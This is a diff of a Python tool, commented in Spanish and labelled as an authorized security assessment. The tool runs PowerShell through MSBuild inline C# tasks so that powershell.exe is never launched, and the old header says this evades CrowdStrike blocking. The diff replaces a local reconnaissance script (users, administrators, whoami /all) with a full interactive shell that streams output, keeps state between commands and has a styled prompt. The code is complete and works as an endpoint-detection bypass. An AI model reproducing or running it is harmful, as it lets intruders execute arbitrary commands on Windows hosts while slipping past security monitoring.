@@ -1,41 +1,44 @@
 """
-ps_msbuild_recon.py — Validacion bypass MSBuild + PS Runspace
-Evaluacion de seguridad autorizada.
+ps_shell.py — Shell interactivo via MSBuild + PowerShell Runspace
+Evaluacion de seguridad autorizada. Sin lanzar powershell.exe.
 
-Tecnica: MSBuild.exe + C# inline task -> PowerShell Runspace
-         Sin lanzar powershell.exe — evade bloqueo CrowdStrike.
-
-Genera: ps_recon_log.txt  y  ps_recon_output.txt
+Mejoras implementadas:
+  - Estado persistente entre comandos (variables simples/arrays/hashtables)
+  - Output en streaming (aparece linea a linea mientras ejecuta)
+  - Ctrl+C cancela el comando actual sin cerrar la shell
+  - Historial con flechas Arriba/Abajo (persistente entre sesiones)
+  - Entrada multilínea (detecta { } ( ) [ ] sin cerrar y pipes/backtick al final)
+  - Tracking de directorio actual en el prompt
+  - Colores al estilo PowerShell
 """
 
-import os
-import sys
-import subprocess
-import tempfile
-import time
-import traceback
-import threading
-from datetime import datetime
+import os, sys, re, time, ctypes, tempfile, subprocess, threading
 from pathlib import Path
 
-LOG_PATH = Path(__file__).parent / "ps_recon_log.txt"
-OUT_PATH = Path(__file__).parent / "ps_recon_output.txt"
-_lf      = None
-_lock    = threading.Lock()
+# ── ANSI ───────────────────────────────────────────────────────────────────────
+RST    = "\033[0m"
+DIM    = "\033[2m"
+RED    = "\033[91m"
+YELLOW = "\033[93m"
+CYAN   = "\033[96m"
+WHITE  = "\033[97m"
+GRAY   = "\033[90m"
+ANSI_RE = re.compile(r'\033\[[0-9;]*[mKJH]')
 
-def L(msg):
-    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
-    line = f"[{ts}] {msg}"
-    print(line)
-    with _lock:
-        if _lf:
-            _lf.write(line + "\n")
-            _lf.flush()
+def enable_ansi():
+    try:
+        k32 = ctypes.windll.kernel32
+        h = k32.GetStdHandle(-11)
+        m = ctypes.c_ulong()
+        k32.GetConsoleMode(h, ctypes.byref(m))
+        k32.SetConsoleMode(h, m.value | 0x0004)
+    except Exception:
+        pass
 
-def SEP(t=""):
-    bar = f"── {t} " if t else "──"
-    L(bar + "─" * max(0, 54 - len(bar)))
+def c(col, txt): return f"{col}{txt}{RST}"
+def vlen(s):     return len(ANSI_RE.sub('', s))
 
+# ── MSBuild ────────────────────────────────────────────────────────────────────
 MSBUILD_PATHS = [
     r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
     r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
@@ -46,54 +49,129 @@ MSBUILD_PATHS = [
 def find_msbuild():
     return next((p for p in MSBUILD_PATHS if os.path.exists(p)), None)
 
-def run_ps_via_msbuild(ps_script, timeout_s=45):
-    msbuild  = find_msbuild()
-    if not msbuild:
-        return False, "MSBuild no encontrado"
+# ── Session files ──────────────────────────────────────────────────────────────
+_SESS_DIR  = None   # set in main
+_MSBUILD   = None
+_PROC      = None
+_PROC_LOCK = threading.Lock()
 
-    tmp_out  = tempfile.NamedTemporaryFile(suffix=".txt", delete=False, mode="w")
-    tmp_out.close()
-    out_path = tmp_out.name.replace("\\", "\\\\")
-    # Escapar para C# string literal de una sola linea:
-    # 1) backslashes primero, 2) comillas, 3) newlines reales -> \n de C#
-    ps_esc = ps_script.strip()
-    ps_esc = ps_esc.replace("\\", "\\\\")
-    ps_esc = ps_esc.replace('"', '\\"')
-    ps_esc = ps_esc.replace("\r\n", "\\n")
-    ps_esc = ps_esc.replace("\n", "\\n")
-    ps_esc = ps_esc.replace("\r", "\\n")
+def _sess(name):
+    return str(Path(_SESS_DIR) / name)
 
-    xml = f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="Run"><ReconTask /></Target>
-  <UsingTask TaskName="ReconTask" TaskFactory="CodeTaskFactory"
+# ── State persistence ──────────────────────────────────────────────────────────
+_PS_BUILTINS = frozenset([
+    'false','true','null','_','args','ConsoleFileName','Error','Event','EventArgs',
+    'EventSubscriber','ExecutionContext','foreach','HOME','Host','input',
+    'LastExitCode','Matches','MyInvocation','NestedPromptLevel','PID','PROFILE',
+    'PSBoundParameters','PSCmdlet','PSCommandPath','PSCulture','PSDebugContext',
+    'PSDefaultParameterValues','PSEdition','PSHome','PSHOME','PSItem',
+    'PSScriptRoot','PSSenderInfo','PSUICulture','PSVersionTable','PWD',
+    'ShellId','StackTrace','switch','this','ConfirmPreference','DebugPreference',
+    'ErrorActionPreference','ErrorView','FormatsEnumerationLimit',
+    'InformationPreference','MaximumHistoryCount','OFS','OutputEncoding',
+    'ProgressPreference','VerbosePreference','WarningPreference','WhatIfPreference',
+    '__sf','__builtin','__s',
+])
+
+def _state_restore(sp, pp):
+    return f"""
+if (Test-Path '{sp}') {{
+  try {{
+    $__s = Get-Content '{sp}' -Raw -EA SilentlyContinue | ConvertFrom-Json
+    if ($__s) {{
+      $__s.PSObject.Properties | ForEach-Object {{
+        try {{ Set-Variable -Name $_.Name -Value $_.Value -Scope Global -EA SilentlyContinue }} catch {{}}
+      }}
+    }}
+  }} catch {{}}
+}}
+"""
+
+def _state_dump(sp, pp):
+    blist = ','.join(f"'{b}'" for b in sorted(_PS_BUILTINS))
+    return f"""
+$__builtin = @({blist})
+$__sf = @{{}}
+Get-Variable -Scope Global -EA SilentlyContinue |
+  Where-Object {{ $__builtin -notcontains $_.Name -and $_.Name -notmatch '^_' }} |
+  ForEach-Object {{
+    try {{
+      $v = $_.Value
+      if ($null -ne $v) {{
+        $t = $v.GetType()
+        if ($t.IsPrimitive -or $v -is [string] -or $v -is [datetime] -or
+            ($v -is [array] -and $v.Length -lt 50) -or
+            $v -is [System.Collections.Hashtable]) {{
+          $__sf[$_.Name] = $v
+        }}
+      }}
+    }} catch {{}}
+  }}
+try {{ $__sf | ConvertTo-Json -Depth 2 -Compress -EA SilentlyContinue | Set-Content '{sp}' -Encoding UTF8 -EA SilentlyContinue }} catch {{}}
+try {{ (Get-Location).Path | Set-Content '{pp}' -Encoding UTF8 -EA SilentlyContinue }} catch {{}}
+"""
+
+# ── PS escaping ────────────────────────────────────────────────────────────────
+def _esc(s):
+    s = s.replace("\\", "\\\\")
+    s = s.replace('"',  '\\"')
+    s = s.replace("\r\n", "\\n")
+    s = s.replace("\n",   "\\n")
+    s = s.replace("\r",   "\\n")
+    return s
+
+# ── C# template ────────────────────────────────────────────────────────────────
+def _build_xml(ps_esc, out_path, streaming=True):
+    if streaming:
+        invoke_block = f"""
+                    var output = new PSDataCollection<PSObject>();
+                    output.DataAdded += (s, ev) => {{
+                      var obj = ((PSDataCollection<PSObject>)s)[ev.Index];
+                      if (obj != null) w.Write(obj.ToString());
+                    }};
+                    var inp = new PSDataCollection<PSObject>();
+                    inp.Complete();
+                    var ia = p.BeginInvoke(inp, output);
+                    while (!ia.IsCompleted) System.Threading.Thread.Sleep(30);
+                    p.EndInvoke(ia);"""
+    else:
+        invoke_block = f"""
+                    foreach (var r2 in p.Invoke()) if (r2 != null) w.Write(r2.ToString());"""
+
+    return f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Run"><T /></Target>
+  <UsingTask TaskName="T" TaskFactory="CodeTaskFactory"
              AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
       <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs"><![CDATA[
-        using Microsoft.Build.Framework;
-        using Microsoft.Build.Utilities;
-        using System.Management.Automation;
-        using System.Management.Automation.Runspaces;
-        using System.Text;
-        using System.IO;
-        public class ReconTask : Task {{
+        using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
+        using System.Management.Automation; using System.Management.Automation.Runspaces;
+        using System.Text; using System.IO;
+        public class T : Task {{
           public override bool Execute() {{
-            var sb = new StringBuilder();
-            try {{
-              using (Runspace rs = RunspaceFactory.CreateRunspace()) {{
-                rs.Open();
-                using (Pipeline p = rs.CreatePipeline()) {{
-                  p.Commands.AddScript("{ps_esc}");
-                  p.Commands.Add("Out-String");
-                  foreach (var r in p.Invoke()) sb.AppendLine(r.ToString());
-                  if (p.Error.Count > 0)
-                    foreach (var e in p.Error.ReadToEnd()) sb.AppendLine(e.ToString());
+            using (var w = new StreamWriter("{out_path}", false, new UTF8Encoding(false))) {{
+              w.AutoFlush = true;
+              try {{
+                using (Runspace rs = RunspaceFactory.CreateRunspace()) {{
+                  rs.Open();
+                  using (Pipeline p = rs.CreatePipeline()) {{
+                    p.Commands.AddScript("{ps_esc}");
+                    var os = new Command("Out-String");
+                    os.Parameters.Add("Stream", true);
+                    p.Commands.Add(os);
+                    {invoke_block}
+                    if (p.Error.Count > 0) {{
+                      w.WriteLine();
+                      foreach (var e in p.Error.ReadToEnd())
+                        w.WriteLine("__ERR__" + e.ToString());
+                    }}
+                  }}
                 }}
+              }} catch (System.Exception ex) {{
+                w.WriteLine("__ERR__" + ex.Message);
               }}
-            }} catch (System.Exception ex) {{
-              sb.AppendLine("EXCEPCION: " + ex.Message);
             }}
-            File.WriteAllText(@"{out_path}", sb.ToString(), Encoding.UTF8);
             return true;
           }}
         }}
@@ -102,136 +180,377 @@ def run_ps_via_msbuild(ps_script, timeout_s=45):
   </UsingTask>
 </Project>"""
 
+# ── Streaming reader thread ────────────────────────────────────────────────────
+def _stream_reader(out_file, stop_evt):
+    pos = 0
+    for _ in range(100):  # wait up to 5s for file creation
+        if Path(out_file).exists():
+            break
+        time.sleep(0.05)
+    else:
+        return
+
+    try:
+        fh = open(out_file, 'r', encoding='utf-8', errors='replace')
+        while not stop_evt.is_set():
+            chunk = fh.read(8192)
+            if chunk:
+                pos += len(chunk)
+                _write_chunk(chunk)
+            else:
+                time.sleep(0.05)
+        # final drain
+        chunk = fh.read()
+        if chunk:
+            _write_chunk(chunk)
+        fh.close()
+    except Exception:
+        pass
+
+def _write_chunk(text):
+    parts = []
+    for line in text.split('\n'):
+        if line.startswith('__ERR__'):
+            msg = line[7:]
+            parts.append(c(RED, f'  {msg}') if msg.strip() else '')
+        else:
+            parts.append(c(WHITE, line))
+    sys.stdout.write('\n'.join(parts))
+    sys.stdout.flush()
+
+# ── Core runner ────────────────────────────────────────────────────────────────
+def run_ps(script, timeout_s=60, with_state=True, stream=True):
+    global _PROC
+    msbuild = _MSBUILD
+
+    tmp_out = tempfile.NamedTemporaryFile(suffix=".txt", delete=False, mode="w")
+    tmp_out.close()
+    op = tmp_out.name.replace("\\", "\\\\")
+
+    if with_state:
+        sp = _sess("state.json")   # paths go through _esc() once — no pre-doubling
+        pp = _sess("pwd.txt")
+        full_ps = _state_restore(sp, pp) + "\n" + script + "\n" + _state_dump(sp, pp)
+    else:
+        full_ps = script
+
+    xml  = _build_xml(_esc(full_ps), op, streaming=stream)
     proj = tempfile.NamedTemporaryFile(suffix=".proj", delete=False,
                                        mode="w", encoding="utf-8")
     proj.write(xml)
     proj.close()
 
+    stop = threading.Event()
+    if stream:
+        t = threading.Thread(target=_stream_reader, args=(tmp_out.name, stop), daemon=True)
+        t.start()
+
+    ok = True
     try:
-        r = subprocess.run(
-            [msbuild, proj.name, "/nologo", "/verbosity:minimal"],
-            capture_output=True, text=True, timeout=timeout_s,
+        proc = subprocess.Popen(
+            [msbuild, proj.name, "/nologo", "/verbosity:quiet"],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             shell=False, encoding="utf-8", errors="replace"
         )
-        if r.returncode != 0:
-            L(f"  MSBuild error rc={r.returncode}")
-            if r.stdout.strip():
-                L(f"  stdout: {r.stdout.strip()[:400]}")
-            if r.stderr.strip():
-                L(f"  stderr: {r.stderr.strip()[:400]}")
-        time.sleep(0.5)
-        result = ""
+        with _PROC_LOCK:
+            _PROC = proc
         try:
-            result = Path(tmp_out.name).read_text(encoding="utf-8", errors="replace").strip()
-        except Exception:
-            pass
-        return bool(result), result
-    except subprocess.TimeoutExpired:
-        return False, "TimeoutExpired"
+            stdout, stderr = proc.communicate(timeout=timeout_s)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            stdout, stderr = proc.communicate()
+            ok = False
+            if stream: print(c(YELLOW, '\n  [timeout]'))
+        finally:
+            with _PROC_LOCK:
+                _PROC = None
+
+        if stream:
+            stop.set()
+            t.join(timeout=2)
+
+        if proc.returncode != 0:
+            err = (stdout + stderr).strip()
+            if err and not stream:
+                pass  # caller handles
+            elif err and stream:
+                print(c(RED, f'  [rc={proc.returncode}] {err[:200]}'))
+            ok = False
+
+        if not stream:
+            try:
+                return ok, Path(tmp_out.name).read_text(encoding='utf-8', errors='replace')
+            except Exception:
+                return ok, ""
+
+    except KeyboardInterrupt:
+        with _PROC_LOCK:
+            if _PROC:
+                try: _PROC.terminate()
+                except: pass
+                _PROC = None
+        if stream:
+            stop.set()
+            t.join(timeout=1)
+        ok = False
+        if stream: print(c(YELLOW, '\n  [cancelado con Ctrl+C]'))
     except Exception as e:
-        return False, str(e)
+        ok = False
+        if stream: print(c(RED, str(e)))
     finally:
         try: os.unlink(proj.name)
         except: pass
         try: os.unlink(tmp_out.name)
         except: pass
 
-BLOQUES = [
-    ("Sistema_Base", """
-$os = Get-CimInstance Win32_OperatingSystem
-$cs = Get-CimInstance Win32_ComputerSystem
-$bios = Get-CimInstance Win32_BIOS
-[PSCustomObject]@{
-    Hostname       = $env:COMPUTERNAME
-    Usuario        = $env:USERNAME
-    Dominio        = $env:USERDOMAIN
-    OS             = $os.Caption
-    Build          = $os.BuildNumber
-    Arquitectura   = $os.OSArchitecture
-    RAM_GB         = [math]::Round($cs.TotalPhysicalMemory/1GB,1)
-    Fabricante     = $cs.Manufacturer
-    Modelo         = $cs.Model
-    SerialBIOS     = $bios.SerialNumber
-    UltimoArranque = $os.LastBootUpTime
-    PSVersion      = $PSVersionTable.PSVersion.ToString()
-    CLR            = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
-    ProcesoPadre   = (Get-Process -Id $PID).Name
-    PID_actual     = $PID
-} | Format-List
-"""),
+    return ok if stream else (ok, "")
 
-    ("Usuarios_y_Grupos", """
-Write-Output "=== USUARIOS LOCALES ==="
-Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordRequired,PasswordExpires | Format-Table -AutoSize
+def run_ps_silent(script, timeout_s=20):
+    ok, out = run_ps(script, timeout_s=timeout_s, with_state=False, stream=False)
+    return out.strip() if ok else ""
 
-Write-Output "`n=== GRUPOS LOCALES ==="
-Get-LocalGroup | Select-Object Name,Description | Format-Table -AutoSize
+# ── Multiline detection ────────────────────────────────────────────────────────
+def is_incomplete(text):
+    depth = {'(': 0, '[': 0, '{': 0}
+    close = {')': '(', ']': '[', '}': '{'}
+    in_str = None
+    i = 0
+    while i < len(text):
+        ch = text[i]
+        if in_str:
+            if in_str == '"' and ch == '`': i += 2; continue
+            if ch == in_str: in_str = None
+        elif ch in ('"', "'"):
+            in_str = ch
+        elif ch in depth:    depth[ch] += 1
+        elif ch in close:    depth[close[ch]] = max(0, depth[close[ch]] - 1)
+        i += 1
+    if any(v > 0 for v in depth.values()):
+        return True
+    s = text.rstrip()
+    return s.endswith('|') or s.endswith('`')
 
-Write-Output "`n=== MIEMBROS DE ADMINISTRADORES ==="
-Get-LocalGroupMember -Group "Administradores" 2>$null
-Get-LocalGroupMember -Group "Administrators" 2>$null
+# ── History ────────────────────────────────────────────────────────────────────
+def load_history(path, maxlen=1000):
+    try:
+        lines = Path(path).read_text(encoding='utf-8').splitlines()
+        return [l for l in lines if l.strip()][-maxlen:]
+    except Exception:
+        return []
 
-Write-Output "`n=== WHOAMI /ALL ==="
-& whoami /all 2>&1
-"""),
-]
+def append_history(line, path):
+    try:
+        with open(path, 'a', encoding='utf-8') as f:
+            f.write(line + '\n')
+    except Exception:
+        pass
 
+# ── Input handler (msvcrt: arrow keys, history, line editing) ─────────────────
+def get_input(prompt_str, history):
+    try:
+        import msvcrt
+    except ImportError:
+        return input(prompt_str)
+
+    pw = vlen(prompt_str)
+    sys.stdout.write(prompt_str)
+    sys.stdout.flush()
+
+    buf      = []
+    pos      = 0
+    hidx     = len(history)
+    saved    = []
+
+    def redraw():
+        line = ''.join(buf)
+        end  = pw + len(buf)
+        cur  = pw + pos
+        sys.stdout.write(f'\r{prompt_str}{line}  \r{prompt_str}')
+        if pos > 0:
+            sys.stdout.write(''.join(buf[:pos]))
+        sys.stdout.flush()
+
+    while True:
+        try:
+            ch = msvcrt.getwch()
+        except Exception:
+            raise KeyboardInterrupt
+
+        if ch == '\r':                              # Enter
+            print()
+            return ''.join(buf)
+
+        elif ch == '\x03':                          # Ctrl+C
+            print('^C')
+            raise KeyboardInterrupt
+
+        elif ch == '\x08':                          # Backspace
+            if pos > 0:
+                buf.pop(pos - 1); pos -= 1; redraw()
+
+        elif ch in ('\xe0', '\x00'):                # Special key prefix
+            ch2 = msvcrt.getwch()
+            if ch2 == 'H':                          # Up arrow
+                if hidx == len(history): saved = buf[:]
+                if hidx > 0:
+                    hidx -= 1; buf = list(history[hidx]); pos = len(buf); redraw()
+            elif ch2 == 'P':                        # Down arrow
+                if hidx < len(history):
+                    hidx += 1
+                    buf  = list(history[hidx]) if hidx < len(history) else saved[:]
+                    pos  = len(buf); redraw()
+            elif ch2 == 'K' and pos > 0:            # Left
+                pos -= 1; sys.stdout.write('\033[1D'); sys.stdout.flush()
+            elif ch2 == 'M' and pos < len(buf):     # Right
+                pos += 1; sys.stdout.write('\033[1C'); sys.stdout.flush()
+            elif ch2 == 'G':                        # Home
+                sys.stdout.write(f'\033[{pos}D') if pos else None
+                pos = 0; sys.stdout.flush()
+            elif ch2 == 'O':                        # End
+                d = len(buf) - pos
+                sys.stdout.write(f'\033[{d}C') if d else None
+                pos = len(buf); sys.stdout.flush()
+            elif ch2 == 'S' and pos < len(buf):     # Del key
+                buf.pop(pos); redraw()
+
+        elif ch == '\x01':                          # Ctrl+A — ir al inicio
+            if pos: sys.stdout.write(f'\033[{pos}D'); pos = 0; sys.stdout.flush()
+        elif ch == '\x05':                          # Ctrl+E — ir al final
+            d = len(buf) - pos
+            if d: sys.stdout.write(f'\033[{d}C'); pos = len(buf); sys.stdout.flush()
+        elif ch == '\x0b':                          # Ctrl+K — borrar hasta el final
+            del buf[pos:]; redraw()
+        elif ch == '\x15':                          # Ctrl+U — borrar hasta el inicio
+            del buf[:pos]; pos = 0; redraw()
+        elif ch == '\x0c':                          # Ctrl+L — limpiar pantalla
+            os.system('cls')
+            sys.stdout.write(prompt_str + ''.join(buf))
+            d = len(buf) - pos
+            if d: sys.stdout.write(f'\033[{d}D')
+            sys.stdout.flush()
+        elif ord(ch) >= 32:                         # Carácter normal
+            buf.insert(pos, ch); pos += 1
+            if pos == len(buf):
+                sys.stdout.write(ch); sys.stdout.flush()
+            else:
+                redraw()
+
+# ── Prompt ─────────────────────────────────────────────────────────────────────
+def read_pwd():
+    try:
+        p = Path(_sess("pwd.txt"))
+        if p.exists():
+            return p.read_text(encoding='utf-8').strip()
+    except Exception:
+        pass
+    return os.environ.get("USERPROFILE", "C:\\")
+
+def make_prompt(pwd):
+    return f"{c(CYAN,'PS')} {c(WHITE, pwd)}{c(CYAN,'>')} "
+
+# ── Banner ─────────────────────────────────────────────────────────────────────
+BANNER = f"""
+{c(WHITE, 'Windows PowerShell')}
+{c(GRAY,  'Copyright (C) Microsoft Corporation. Todos los derechos reservados.')}
+
+{c(DIM+GRAY, 'Engine : MSBuild.exe + C# Runspace  (sin powershell.exe)')}
+{c(DIM+GRAY, 'Estado : persiste entre comandos  |  Streaming: activo')}
+{c(DIM+GRAY, 'Teclas : ↑↓ historial  Ctrl+C cancela  Ctrl+L limpia  { multilinea')}
+"""
+
+# ── Main ───────────────────────────────────────────────────────────────────────
 def main():
-    global _lf
-    _lf = open(LOG_PATH, "w", encoding="utf-8", buffering=1)
-
-    L(f"=== ps_msbuild_recon.py {datetime.now()} ===")
-    L(f"PID     : {os.getpid()}")
-    L(f"Usuario : {os.environ.get('USERNAME','?')}@{os.environ.get('USERDOMAIN','?')}")
-    L(f"Python  : {sys.version.split()[0]}")
+    global _SESS_DIR, _MSBUILD
 
     if sys.platform != "win32":
-        L("ABORTAR: requiere Windows")
-        input("Enter para salir...")
-        return
+        print("ABORTAR: requiere Windows"); return
 
-    msbuild = find_msbuild()
-    if not msbuild:
-        L("ERROR: MSBuild.exe no encontrado")
-        input("Enter para salir...")
-        return
-    L(f"MSBuild : {msbuild}")
+    enable_ansi()
 
-    out_lines = [
-        "TSI Security Assessment — Bypass MSBuild PS Runspace",
-        f"Fecha   : {datetime.now()}",
-        f"Equipo  : {os.environ.get('COMPUTERNAME','?')}",
-        f"Usuario : {os.environ.get('USERNAME','?')}@{os.environ.get('USERDOMAIN','?')}",
-        "Tecnica : MSBuild.exe + C# inline -> PowerShell Runspace (sin powershell.exe)",
-        "=" * 70,
-        "",
-    ]
+    _MSBUILD = find_msbuild()
+    if not _MSBUILD:
+        print(c(RED, "ERROR: MSBuild.exe no encontrado")); input(); return
 
-    exitosos = 0
-    for i, (name, script) in enumerate(BLOQUES, 1):
-        SEP(f"{i}/{len(BLOQUES)} {name}")
+    # Directorio de sesion en %TEMP%
+    _SESS_DIR = os.path.join(tempfile.gettempdir(), "pssess")
+    os.makedirs(_SESS_DIR, exist_ok=True)
+
+    hist_path = _sess("history.txt")
+    history   = load_history(hist_path)
+
+    print(BANNER)
+    print(c(GRAY, "  Iniciando sesion..."), end="\r")
+
+    # Obtener pwd inicial via MSBuild
+    pwd0 = run_ps_silent("(Get-Location).Path")
+    current_pwd = pwd0 if pwd0 else os.environ.get("USERPROFILE", "C:\\")
+    print(" " * 30, end="\r")
+
+    while True:
+        # Leer la linea (con soporte multilinea)
+        prompt = make_prompt(current_pwd)
         try:
-            ok, output = run_ps_via_msbuild(script)
-            if ok:
-                L(f"  OK — {len(output)} chars")
-                exitosos += 1
-                out_lines += [f"\n{'='*70}", f"  {name}", f"{'='*70}", output]
-            else:
-                L(f"  SIN OUTPUT — {output[:100]}")
-                out_lines.append(f"\n[{name}] sin output: {output[:100]}")
-        except Exception:
-            L(f"  EXCEPCION: {traceback.format_exc()}")
+            line = get_input(prompt, history)
+        except KeyboardInterrupt:
+            print()
+            continue
 
-    OUT_PATH.write_text("\n".join(out_lines), encoding="utf-8")
+        cmd = line.strip()
+        if not cmd:
+            continue
 
-    SEP("RESUMEN")
-    L(f"Exitosos : {exitosos}/{len(BLOQUES)}")
-    L(f"Output   : {OUT_PATH}")
-    L(f"Tecnica  : powershell.exe nunca fue lanzado")
+        # Comandos internos
+        cmd_l = cmd.lower()
+        if cmd_l in ("exit", "quit", "q"):
+            break
+        if cmd_l in ("cls", "clear"):
+            os.system("cls"); continue
+        if cmd_l == "help":
+            print(c(CYAN, "\n  Atajos de teclado:"))
+            for k, v in [("↑ / ↓", "navegar historial"),
+                         ("← / →", "mover cursor"),
+                         ("Inicio / Fin", "ir al principio / final"),
+                         ("Ctrl+A / E", "inicio / final de línea"),
+                         ("Ctrl+K", "borrar hasta el final"),
+                         ("Ctrl+U", "borrar hasta el inicio"),
+                         ("Ctrl+L", "limpiar pantalla"),
+                         ("Ctrl+C", "cancelar comando actual"),
+                         ("{ sin cerrar", "modo multilínea — Intro para seguir")]:
+                print(f"    {c(YELLOW, k):30s} {c(GRAY, v)}")
+            print()
+            continue
 
-    if _lf:
-        _lf.close()
-    input("\nEnter para cerrar...")
+        # Acumular bloques multilinea
+        full_cmd = cmd
+        while is_incomplete(full_cmd):
+            cont_prompt = f"{c(GRAY, '>>')} "
+            try:
+                more = get_input(cont_prompt, history)
+            except KeyboardInterrupt:
+                full_cmd = ""; break
+            full_cmd += "\n" + more
+
+        if not full_cmd.strip():
+            continue
+
+        # Guardar en historial
+        history.append(full_cmd)
+        append_history(full_cmd, hist_path)
+
+        # Ejecutar
+        t0 = time.time()
+        run_ps(full_cmd, timeout_s=120, with_state=True, stream=True)
+        elapsed = time.time() - t0
+
+        # Actualizar prompt con nuevo pwd
+        new_pwd = read_pwd()
+        if new_pwd:
+            current_pwd = new_pwd
+
+        if elapsed > 3.0:
+            print(c(GRAY, f"  [{elapsed:.1f}s]"))
+
+    print(c(GRAY, "\nSesion terminada.\n"))
 
 if __name__ == "__main__":
     main()
